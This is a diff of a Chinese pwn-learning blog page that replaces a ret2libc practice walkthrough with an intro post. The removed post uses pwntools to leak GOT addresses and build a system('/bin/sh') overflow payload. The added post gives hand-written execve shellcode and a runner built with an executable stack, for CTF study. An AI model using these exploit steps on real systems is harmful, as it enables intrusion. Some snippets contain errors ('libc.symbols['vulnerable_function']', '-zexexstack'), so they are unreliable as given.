@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     
     
-    <title>Introduction to pwn 1.3--ret2libc practice | Room of Requirement | pwn what you want</title>
+    <title>Introduction to pwn1.1 | Room of Requirement | pwn what you want</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     <meta name="keywords" content="pwn,stack">
@@ -173,7 +173,7 @@
           <i class="icon icon-lg icon-navicon"></i>
         </a>
         <div class="flex-col header-title ellipsis">
-            <span>Introduction to pwn 1.3--ret2libc practice</span>
+            <span>Introduction to pwn1.1</span>
             
         </div>
         
@@ -186,11 +186,11 @@
 <header class="content-header post-header">
     <img src="/img/banner.jpg" class="header-bg">
     <div class="container fade-scale">
-        <h1 class="title">Introduction to pwn 1.3--ret2libc practice</h1>
+        <h1 class="title">Introduction to pwn1.1</h1>
         <h5 class="subtitle">
             
-                <time datetime="2018-08-28T04:12:56.000Z" itemprop="datePublished" class="page-time">
-  2018-08-28
+                <time datetime="2018-08-13T14:35:13.000Z" itemprop="datePublished" class="page-time">
+  2018-08-13
 </time>
 
 
@@ -221,12 +221,12 @@
 
 
 <div class="container body-wrap">
-    <article id="post-pwn-入门1-3-plt-got"
+    <article id="post-Introduction to pwn1.1"
   class="post-article article-type-post" itemprop="blogPost">
     <div class="post-card">
-        <h1 class="post-card-title">Introduction to pwn 1.3--ret2libc practice</h1>
+        <h1 class="post-card-title">Introduction to pwn1.1</h1>
         <div class="post-meta">
-            <time class="post-time" title="2018-08-28 12:12:56" datetime="2018-08-28T04:12:56.000Z"  itemprop="datePublished">2018-08-28</time>
+            <time class="post-time" title="2018-08-13 22:35:13" datetime="2018-08-13T14:35:13.000Z"  itemprop="datePublished">2018-08-13</time>
 
             
 	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>
@@ -242,55 +242,45 @@
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             
-            <h1 id="关于ret2libc-中的plt-got"><a href="#关于ret2libc-中的plt-got" class="headerlink" title="关于ret2libc 中的plt/got"></a>关于ret2libc 中的plt/got</h1><h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>即当第一次使用某函数时，GOT表中对应表项保存的并不是真实的函数地址，需要通过_dl_runtime_resolve查找到真实的函数地址并填入GOT对应表项，从而在下次再使用该函数时，无需进行查找。我们要泄漏的就是初始化查找后填入GOT对应表项中的函数地址。</p>
-<ul>
-<li>使用gdb，断点下在write函数之后，运行，x查看write.plt.got处的值，即实际地址；*<br><a rel=Introduction to pwn 1.3--ret2libc practice href="/2018/08/28/pwn-入门1-3-plt-got/write.png" class="swipebox" title=<img src="/2018/08/28/pwn-入门1-3-plt-got/write.png" alt="图四">><img src="/2018/08/28/pwn-入门1-3-plt-got/write.png" alt="图四"></a>    <a rel=Introduction to pwn 1.3--ret2libc practice href="/2018/08/28/pwn-入门1-3-plt-got/wrgot.png" class="swipebox" title=<img src="/2018/08/28/pwn-入门1-3-plt-got/wrgot.png" alt="图五">><img src="/2018/08/28/pwn-入门1-3-plt-got/wrgot.png" alt="图五"></a></li>
+            <h3 id="各种变量的存储位置"><a href="#各种变量的存储位置" class="headerlink" title="各种变量的存储位置"></a>各种变量的存储位置</h3><ol>
+<li>stack：局部变量</li>
+<li>heap: 动态分配内存的变量（malloc/new）</li>
+<li>bss section: 全局化的未初始化的变量</li>
+<li>data section: 全局化的已初始化的变量<ul>
+<li>rodata: （只读data段）全局化的静态变量（const）</li>
 </ul>
-<h2 id="plt-与-got"><a href="#plt-与-got" class="headerlink" title="plt 与 got"></a>plt 与 got</h2><p>文件的plt表中存放着函数的.plt.got 地址，.plt.got 地址处的值为该函数的真正的got地址（也就是我们需要泄露的）</p>
-<p>由于延迟绑定机制的存在，我们只能通过泄露被调用的函数的got地址，同时又因为同一libc库中各函数之间的偏移是固定的，我们就能因此来求出其他函数的got地址。</p>
-<h1 id="ret2libc的实现"><a href="#ret2libc的实现" class="headerlink" title="ret2libc的实现"></a>ret2libc的实现</h1><ol>
-<li>文件给了一个pwnme文件与libc-2.19.so文件；checksec查看文件保护，IDA 查看源码，可以看到buf大小只有0x8，read却允许读入0x100大小的数据，有着明显的栈溢出；</li>
+</li>
 </ol>
-<figure class="image-box">
-                <a rel=Introduction to pwn 1.3--ret2libc practice href="/2018/08/28/pwn-入门1-3-plt-got/ida.png" class="swipebox" title=undefined><img src="/2018/08/28/pwn-入门1-3-plt-got/ida.png" alt="图一](pwn-入门1-3-plt-got/checksec.png)  ![图二" title="" class=""></a>
-                <p>图一](pwn-入门1-3-plt-got/checksec.png)  ![图二</p>
-            </figure>
-<ol start="2">
-<li>查看应用调用函数plt表，<code>objdump -d -M intel -j .plt pwnme</code>可以看到没有调用system，需要我们利用其它已调用的来泄露；</li>
-</ol>
-<figure class="image-box">
-                <a rel=Introduction to pwn 1.3--ret2libc practice href="/2018/08/28/pwn-入门1-3-plt-got/plt.png" class="swipebox" title=undefined><img src="/2018/08/28/pwn-入门1-3-plt-got/plt.png" alt="图三" title="" class=""></a>
-                <p>图三</p>
-            </figure>
-<ol start="3">
-<li>这里决定泄露write函数的got地址：使用pwntools，使程序运行完write函数，得到真实的got地址；</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn = ELF(&apos;pwnme&apos;) </span><br><span class="line">sh.recvuntil(&apos;flag:&apos;) </span><br><span class="line">wri_got = pwn.got[&apos;write&apos;]</span><br></pre></td></tr></table></figure>
-<ol start="4">
-<li>构造payload泄露write函数的实际地址</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay = &apos;a&apos;*20 + p32(pwn.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(wri_got) + p32(4)</span><br></pre></td></tr></table></figure>
-<ol start="4">
-<li>泄露libc中的system与/bin/sh地址</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line">sys_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next()</span><br></pre></td></tr></table></figure>
-<ol start="5">
-<li>构造payload </li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*20 + p32(sys_addr) + &apos;bbbb&apos; + p32(binsh_addr)</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int a = 0;   //.data</span><br><span class="line">int b;       //.bss</span><br><span class="line">const double PI = 3.1415    //rodata</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int c = 2;    //stack</span><br><span class="line">	char *d = malloc(16);    //heap</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="linux下将shellcode运行"><a href="#linux下将shellcode运行" class="headerlink" title="linux下将shellcode运行"></a>linux下将shellcode运行</h3><p>1.手写简易shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">jmp sh</span><br><span class="line">run:</span><br><span class="line">    pop ebx</span><br><span class="line">    mov BYTE [ebx+7],0</span><br><span class="line">    xor eax,eax</span><br><span class="line">    mov al,11</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    xor edx,edx</span><br><span class="line">    int 0x80</span><br><span class="line">sh:</span><br><span class="line">    call run</span><br><span class="line">    db &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
+<p>2.一系列步骤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Assembly:  nasm a.asm -o a.o -felf32   </span><br><span class="line">Extract Shellcode: objcopy -O binary a.o code   //将a.o中需要用内容的提取到code中</span><br><span class="line">                   xxd -i code        //将提取出来的code转换为机器码</span><br></pre></td></tr></table></figure>
+<p>3.带入调用shellcode的程序test.c</p>
+<pre><code>#include  &quot;code.h&quot;
 
+typedef int(*CODE)();
+
+int main()
+{
+    ((CODE)shellcode)();
+}
+
+Run Shellcode: gcc test.c -o test -m32 -zexexstack       
+</code></pre>
         </div>
         
 <blockquote class="post-copyright">
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2019-01-30T06:05:25.222Z" itemprop="dateUpdated">2019-01-30 14:05:25</time>
+    Last updated: <time datetime="2019-03-12T14:28:50.019Z" itemprop="dateUpdated">2019-03-12 22:28:50</time>
 </span><br>
 
 
         
-        转载注明出处，原文地址：<a href="/2018/08/28/pwn-入门1-3-plt-got/" target="_blank" rel="external">http://siriuswhiter.tk/2018/08/28/pwn-入门1-3-plt-got/</a>
+        转载注明出处，原文地址：<a href="/2018/08/13/Introduction to pwn1.1/" target="_blank" rel="external">http://siriuswhiter.tk/2018/08/13/Introduction to pwn1.1/</a>
         
     </div>
     <footer>
@@ -319,7 +309,7 @@
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/08/28/pwn-入门1-3-plt-got/&title=《Introduction to pwn 1.3--ret2libc practice》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/08/13/Introduction to pwn1.1/&title=《Introduction to pwn1.1》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -331,7 +321,7 @@
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/08/28/pwn-入门1-3-plt-got/&title=《Introduction to pwn 1.3--ret2libc practice》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/08/13/Introduction to pwn1.1/&title=《Introduction to pwn1.1》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -357,18 +347,18 @@
 <nav class="post-nav flex-row flex-justify-between">
   
     <div class="prev">
-      <a href="/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/" id="post-prev" class="post-nav-link">
+      <a href="/2018/08/13/markdown规范学习/" id="post-prev" class="post-nav-link">
         <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">pwn-300-Formatting string vulnerability</h4>
+        <h4 class="title">Markdown standard</h4>
       </a>
     </div>
   
 
   
     <div class="next">
-      <a href="/2018/08/28/pwn-入门2.3-UAF/" id="post-next" class="post-nav-link">
+      <a href="/2018/08/02/learning-python/" id="post-next" class="post-nav-link">
         <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">Introduction to pwn2.3--UAF</h4>
+        <h4 class="title">Learning python</h4>
       </a>
     </div>
   
@@ -380,7 +370,7 @@
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#关于ret2libc-中的plt-got"><span class="post-toc-number">1.</span> <span class="post-toc-text">关于ret2libc 中的plt/got</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#延迟绑定"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">延迟绑定</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#plt-与-got"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">plt 与 got</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ret2libc的实现"><span class="post-toc-number">2.</span> <span class="post-toc-text">ret2libc的实现</span></a></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#各种变量的存储位置"><span class="post-toc-number">1.</span> <span class="post-toc-text">各种变量的存储位置</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#linux下将shellcode运行"><span class="post-toc-number">2.</span> <span class="post-toc-text">linux下将shellcode运行</span></a></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </aside>
@@ -466,7 +456,7 @@
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/08/28/pwn-入门1-3-plt-got/&title=《Introduction to pwn 1.3--ret2libc practice》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/08/13/Introduction to pwn1.1/&title=《Introduction to pwn1.1》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -478,7 +468,7 @@
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/08/28/pwn-入门1-3-plt-got/&title=《Introduction to pwn 1.3--ret2libc practice》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/08/13/Introduction to pwn1.1/&title=《Introduction to pwn1.1》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -490,7 +480,7 @@
 <div class="page-modal wx-share" id="wxShare">
     <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLElEQVR42u3aQVbDMAwFwN7/0uUAJc6XnBRiT1a8YLAnCz3J0usVP++P5/N9sj7f5XXHg4GB8VjGe/gcbZBsebR+/D757S/7YmBgbMBIDnG0fryyGnzHex2+x8DAwJhYk4TOccDFwMDA6B1xXL4msGr4xsDAwKgGvhxWTTdvr8UxMDAeyMhv3b//8y39DQwMjEcx5gvL3rV+tYVwcioMDIylGdVSMzlWdbSiN2yBgYGxDyMZ5+oF3Lygnb/Uw8DA2IHRG4BIRr7GHyghJZ8PAwNjbUavjEwOF21ZZERJJAYGxnKMXoCbuXqrrixX4RgYGEszqkfvhdRqMI2u8zAwMDZgJH/QO+JVIftkLAMDA2NpRi+ly5uR8/GwUItjYGBsw6gea6YBkJfQhftCDAyMDRh5QHy3nvx/lkfNMDAwlmZUmwRJangV9bJhCwwMjEUZSYmbBMokgOZ/e/JZMTAwlmPMJIXVAbI8rOfDFlP9DQwMjIcwegOsVw1hJCVuOVXFwMBYlNG7FKsOZEyVpklCiYGBsQGjGjR77cbqEcvDFhgYGJsxeqEwbzcWGpP5sAUGBsZyjPlRiZkmaH6FF9XfGBgYizJ6YW4mvOaFbm+ADAMDY1XGVUE2D+i3fDIMDIwNGNXAl7cTrk37oh4sBgYGxvAS/6TR2GptvmZ8GBgYGzOSo/caovlF3mELEwMDY1FGbzj1r5JFDAyM3RhX5V35+96o2ZfSRwwMjP/F+AE8fNE/W/y8MwAAAABJRU5ErkJggg==" alt="微信分享二维码">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKUlEQVR42u3aS5LjIBAFQN//0pqtFy30qpAnAkhWHbZCkF5UU5/PJ17X1/r+ZPzt9yd37xzv8vLCwMBYlnEN13iDBDPe5e7b/GwYGBjnMMYBsRdex7AkECdnw8DAwMhDZ3Lo5EkMDAyMtxjVtDPfBQMDA2Mmie0F4l4Q/2EujoGBsSAjr7r//79/0t/AwMBYinEVV3Jdm29nlk+FgYGxNaNarJ9/Mi/GlXfBwMDYmlFNI3vhMjlKDrulYmBgbMqYH56Yufblx314HgMD4xhGskFS+s+peSOhWXTDwMBYnPHuCEW1uN8D3FYNMTAwtmZUL2Q9WJ7ElgfFMDAwtmZUk8xqsazX4Gy2FjAwMDZlVDeuJpn56EZ+9D+oGBgYxzBmAmhyTeyF3an/GBgYGBsxkiA40zzIE+NmewADA2NrRp7EzjQ7e2Nn+dswMDAwesX9auOhmtaWq4YYGBjLMqoXuCTg9pqj1Tc8DFtgYGBsxJhpLuapZv58fhl9mBzBwMA4hvGLgYm8tJf/QBgYGOcwqq3K6jUxb3w2hzAwMDAOYDTDXHEII6E2YRgYGJsyruLqtSqrnYokiH/yTBcDA2NxRr6SMFoNsjlp5oqJgYGxB6PXnsxbktVSWjPgYmBgHMCYCZT5xvPXvod7LgYGBkZcdMsLeVUYBgYGRjXg5kH2rWbDQ3sAAwNja0beDKiGy7eulQ+hHAMDY2vGVOqYz3QUD/FWmwEDA2Nxxj+qxvoIgY7FKgAAAABJRU5ErkJggg==" alt="微信分享二维码">
 </div>
 
 
